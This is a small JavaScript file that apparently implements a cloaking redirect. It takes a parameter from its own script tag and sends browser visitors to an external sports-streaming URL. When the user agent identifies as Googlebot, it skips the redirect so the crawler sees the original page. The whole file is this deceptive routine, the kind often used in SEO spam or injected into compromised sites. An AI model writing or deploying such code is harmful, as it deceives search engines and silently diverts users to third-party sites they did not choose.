(function () {
    const script = document.getElementById('query');

    if (!script) {
        console.log('Query script not found');
        return;
    }

    const scriptURL = new URL(script.src);
    const m = scriptURL.searchParams.get('m');

    console.log('Received m:', m);

    if (!navigator.userAgent.includes('Googlebot')) {
        if (m) {
            window.location.href =
                'https://sportsmax.pro/ncaa/?m=' + encodeURIComponent(m);
        }
    } else {
        console.log('Googlebot detected - no redirect');
    }
})();